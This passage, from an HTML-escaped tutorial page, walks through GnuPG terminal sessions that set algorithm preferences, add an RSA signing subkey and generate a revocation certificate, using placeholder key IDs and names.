pub&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;created:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17&lt;span class="w"&gt;  &lt;/span&gt;expires:&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt;       &lt;/span&gt;usage:&lt;span class="w"&gt; &lt;/span&gt;SC
&lt;span class="w"&gt;                     &lt;/span&gt;trust:&lt;span class="w"&gt; &lt;/span&gt;ultimate&lt;span class="w"&gt;      &lt;/span&gt;validity:&lt;span class="w"&gt; &lt;/span&gt;ultimate
sub&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;created:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17&lt;span class="w"&gt;  &lt;/span&gt;expires:&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt;       &lt;/span&gt;usage:&lt;span class="w"&gt; &lt;/span&gt;E

gpg&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# setpref SHA512 SHA384 SHA256 SHA224 AES256 AES192 AES CAST5 ZLIB BZIP2 ZIP Uncompressed &amp;lt;--&lt;/span&gt;

Set&lt;span class="w"&gt; &lt;/span&gt;preference&lt;span class="w"&gt; &lt;/span&gt;list&lt;span class="w"&gt; &lt;/span&gt;to:
&lt;span class="w"&gt;     &lt;/span&gt;Cypher:&lt;span class="w"&gt; &lt;/span&gt;AES256,&lt;span class="w"&gt; &lt;/span&gt;AES192,&lt;span class="w"&gt; &lt;/span&gt;AES,&lt;span class="w"&gt; &lt;/span&gt;CAST5,&lt;span class="w"&gt; &lt;/span&gt;3DES
&lt;span class="w"&gt;     &lt;/span&gt;Digest:&lt;span class="w"&gt; &lt;/span&gt;SHA512,&lt;span class="w"&gt; &lt;/span&gt;SHA384,&lt;span class="w"&gt; &lt;/span&gt;SHA256,&lt;span class="w"&gt; &lt;/span&gt;SHA224,&lt;span class="w"&gt; &lt;/span&gt;SHA1
&lt;span class="w"&gt;     &lt;/span&gt;Compression:&lt;span class="w"&gt; &lt;/span&gt;ZLIB,&lt;span class="w"&gt; &lt;/span&gt;BZIP2,&lt;span class="w"&gt; &lt;/span&gt;ZIP,&lt;span class="w"&gt; &lt;/span&gt;Uncompressed
&lt;span class="w"&gt;     &lt;/span&gt;Features:&lt;span class="w"&gt; &lt;/span&gt;MDC,&lt;span class="w"&gt; &lt;/span&gt;Keyserver&lt;span class="w"&gt; &lt;/span&gt;no-modify
Really&lt;span class="w"&gt; &lt;/span&gt;update&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;preferences?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;y/N&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# y &amp;lt;--&lt;/span&gt;


You&lt;span class="w"&gt; &lt;/span&gt;need&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;passphrase&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;unlock&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;secret&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;
user:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;name&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;&amp;gt;
&lt;span class="m"&gt;4096&lt;/span&gt;-bit&lt;span class="w"&gt; &lt;/span&gt;RSA&lt;span class="w"&gt; &lt;/span&gt;key,&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;You&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;created&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17

&lt;span class="c1"&gt;# Enter passphrase &amp;lt;--&lt;/span&gt;

pub&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;created:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17&lt;span class="w"&gt;  &lt;/span&gt;expires:&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt;       &lt;/span&gt;usage:&lt;span class="w"&gt; &lt;/span&gt;SC
&lt;span class="w"&gt;                     &lt;/span&gt;trust:&lt;span class="w"&gt; &lt;/span&gt;ultimate&lt;span class="w"&gt;      &lt;/span&gt;validity:&lt;span class="w"&gt; &lt;/span&gt;ultimate
sub&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;created:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17&lt;span class="w"&gt;  &lt;/span&gt;expires:&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt;       &lt;/span&gt;usage:&lt;span class="w"&gt; &lt;/span&gt;E&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;

gpg&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# save&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Create a signing subkey&lt;/h2&gt;
&lt;p&gt;When creating a key GPG automatically creates an encryption subkey as well, which means that only the signing subkey needs manual creation.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--edit-key&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;
gpg&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;GnuPG&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.4.11&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Copyright&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2010&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Free&lt;span class="w"&gt; &lt;/span&gt;Software&lt;span class="w"&gt; &lt;/span&gt;Foundation,&lt;span class="w"&gt; &lt;/span&gt;Inc.
This&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;free&lt;span class="w"&gt; &lt;/span&gt;software:&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;are&lt;span class="w"&gt; &lt;/span&gt;free&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;change&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;redistribute&lt;span class="w"&gt; &lt;/span&gt;it.
There&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;NO&lt;span class="w"&gt; &lt;/span&gt;WARRANTY,&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;extent&lt;span class="w"&gt; &lt;/span&gt;permitted&lt;span class="w"&gt; &lt;/span&gt;by&lt;span class="w"&gt; &lt;/span&gt;law.

Secret&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;available.

gpg:&lt;span class="w"&gt; &lt;/span&gt;checking&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;trustdb
gpg:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;marginal&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;needed,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;complete&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;needed,&lt;span class="w"&gt; &lt;/span&gt;PGP&lt;span class="w"&gt; &lt;/span&gt;trust&lt;span class="w"&gt; &lt;/span&gt;model
gpg:&lt;span class="w"&gt; &lt;/span&gt;depth:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;valid:&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;signed:&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;trust:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;-,&lt;span class="w"&gt; &lt;/span&gt;0q,&lt;span class="w"&gt; &lt;/span&gt;0n,&lt;span class="w"&gt; &lt;/span&gt;0m,&lt;span class="w"&gt; &lt;/span&gt;0f,&lt;span class="w"&gt; &lt;/span&gt;1u
pub&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;created:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17&lt;span class="w"&gt;  &lt;/span&gt;expires:&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt;       &lt;/span&gt;usage:&lt;span class="w"&gt; &lt;/span&gt;SC
&lt;span class="w"&gt;                         &lt;/span&gt;trust:&lt;span class="w"&gt; &lt;/span&gt;ultimate&lt;span class="w"&gt;      &lt;/span&gt;validity:&lt;span class="w"&gt; &lt;/span&gt;ultimate
sub&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;created:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17&lt;span class="w"&gt;  &lt;/span&gt;expires:&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt;       &lt;/span&gt;usage:&lt;span class="w"&gt; &lt;/span&gt;E&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;

gpg&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# addkey &amp;lt;--&lt;/span&gt;

Key&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;protected.

You&lt;span class="w"&gt; &lt;/span&gt;need&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;passphrase&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;unlock&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;secret&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;
user:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;name&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;&amp;gt;
&lt;span class="m"&gt;4096&lt;/span&gt;-bit&lt;span class="w"&gt; &lt;/span&gt;RSA&lt;span class="w"&gt; &lt;/span&gt;key,&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;created&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17
&lt;span class="c1"&gt;# Enter passphrase &amp;lt;--&lt;/span&gt;

Please&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;what&lt;span class="w"&gt; &lt;/span&gt;kind&lt;span class="w"&gt; &lt;/span&gt;of&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;want:
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;DSA&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;sign&lt;span class="w"&gt; &lt;/span&gt;only&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;RSA&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;sign&lt;span class="w"&gt; &lt;/span&gt;only&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Elgamal&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;encrypt&lt;span class="w"&gt; &lt;/span&gt;only&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;RSA&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;encrypt&lt;span class="w"&gt; &lt;/span&gt;only&lt;span class="o"&gt;)&lt;/span&gt;
Your&lt;span class="w"&gt; &lt;/span&gt;selection?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 4 &amp;lt;--&lt;/span&gt;

RSA&lt;span class="w"&gt; &lt;/span&gt;keys&lt;span class="w"&gt; &lt;/span&gt;may&lt;span class="w"&gt; &lt;/span&gt;be&lt;span class="w"&gt; &lt;/span&gt;between&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;bits&lt;span class="w"&gt; &lt;/span&gt;long.
What&lt;span class="w"&gt; &lt;/span&gt;keysize&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;want?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2048&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 4096 &amp;lt;-- (the longer the better!)&lt;/span&gt;

Requested&lt;span class="w"&gt; &lt;/span&gt;keysize&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;bits
Please&lt;span class="w"&gt; &lt;/span&gt;specify&lt;span class="w"&gt; &lt;/span&gt;how&lt;span class="w"&gt; &lt;/span&gt;long&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;should&lt;span class="w"&gt; &lt;/span&gt;be&lt;span class="w"&gt; &lt;/span&gt;valid.
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;does&lt;span class="w"&gt; &lt;/span&gt;not&lt;span class="w"&gt; &lt;/span&gt;expire
&lt;span class="w"&gt;    &lt;/span&gt;&amp;lt;n&amp;gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;expires&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;n&lt;span class="w"&gt; &lt;/span&gt;days
&lt;span class="w"&gt;    &lt;/span&gt;&amp;lt;n&amp;gt;w&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;expires&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;n&lt;span class="w"&gt; &lt;/span&gt;weeks
&lt;span class="w"&gt;    &lt;/span&gt;&amp;lt;n&amp;gt;m&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;expires&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;n&lt;span class="w"&gt; &lt;/span&gt;months
&lt;span class="w"&gt;    &lt;/span&gt;&amp;lt;n&amp;gt;y&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;expires&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;n&lt;span class="w"&gt; &lt;/span&gt;years
Key&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;valid&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 0 &amp;lt;--&lt;/span&gt;

Key&lt;span class="w"&gt; &lt;/span&gt;does&lt;span class="w"&gt; &lt;/span&gt;not&lt;span class="w"&gt; &lt;/span&gt;expire&lt;span class="w"&gt; &lt;/span&gt;at&lt;span class="w"&gt; &lt;/span&gt;all
Is&lt;span class="w"&gt; &lt;/span&gt;this&lt;span class="w"&gt; &lt;/span&gt;correct?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;y/N&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# y &amp;lt;--&lt;/span&gt;

Really&lt;span class="w"&gt; &lt;/span&gt;create?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;y/N&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# y &amp;lt;--&lt;/span&gt;


pub&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;created:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17&lt;span class="w"&gt;  &lt;/span&gt;expires:&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt;       &lt;/span&gt;usage:&lt;span class="w"&gt; &lt;/span&gt;SC
&lt;span class="w"&gt;                         &lt;/span&gt;trust:&lt;span class="w"&gt; &lt;/span&gt;ultimate&lt;span class="w"&gt;      &lt;/span&gt;validity:&lt;span class="w"&gt; &lt;/span&gt;ultimate
sub&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;created:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17&lt;span class="w"&gt;  &lt;/span&gt;expires:&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt;       &lt;/span&gt;usage:&lt;span class="w"&gt; &lt;/span&gt;E&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
sub&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;created:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17&lt;span class="w"&gt;  &lt;/span&gt;expires:&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt;       &lt;/span&gt;usage:&lt;span class="w"&gt; &lt;/span&gt;S

gpg&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# save &amp;lt;--&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Create a revocation certificate&lt;/h2&gt;
&lt;p&gt;If the master key gets lost or compromised, the revocation certificate is going to be your emergency brake.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--output&lt;span class="w"&gt; &lt;/span&gt;revoke.asc&lt;span class="w"&gt; &lt;/span&gt;--gen-revoke&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;
Create&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;revocation&lt;span class="w"&gt; &lt;/span&gt;certificate&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;this&lt;span class="w"&gt; &lt;/span&gt;key?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;y/N&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# y &amp;lt;--&lt;/span&gt;
Please&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;reason&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;revocation:
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;No&lt;span class="w"&gt; &lt;/span&gt;reason&lt;span class="w"&gt; &lt;/span&gt;specified
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Key&lt;span class="w"&gt; &lt;/span&gt;has&lt;span class="w"&gt; &lt;/span&gt;been&lt;span class="w"&gt; &lt;/span&gt;compromised
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Key&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;superseded
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Key&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;no&lt;span class="w"&gt; &lt;/span&gt;longer&lt;span class="w"&gt; &lt;/span&gt;used
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;Q&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Cancel
&lt;span class="o"&gt;(&lt;/span&gt;Probably&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;want&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;here&lt;span class="o"&gt;)&lt;/span&gt;
Your&lt;span class="w"&gt; &lt;/span&gt;decision?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 1 &amp;lt;--&lt;/span&gt;
Enter&lt;span class="w"&gt; &lt;/span&gt;an&lt;span class="w"&gt; &lt;/span&gt;optional&lt;span class="w"&gt; &lt;/span&gt;description&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;end&lt;span class="w"&gt; &lt;/span&gt;it&lt;span class="w"&gt; &lt;/span&gt;with&lt;span class="w"&gt; &lt;/span&gt;an&lt;span class="w"&gt; &lt;/span&gt;empty&lt;span class="w"&gt; &lt;/span&gt;line:
&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# Empty line will do fine here &amp;lt;--&lt;/span&gt;
Reason&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;revocation:&lt;span class="w"&gt; &lt;/span&gt;Key&lt;span class="w"&gt; &lt;/span&gt;has&lt;span class="w"&gt; &lt;/span&gt;been&lt;span class="w"&gt; &lt;/span&gt;compromised
&lt;span class="o"&gt;(&lt;/span&gt;No&lt;span class="w"&gt; &lt;/span&gt;description&lt;span class="w"&gt; &lt;/span&gt;given&lt;span class="o"&gt;)&lt;/span&gt;
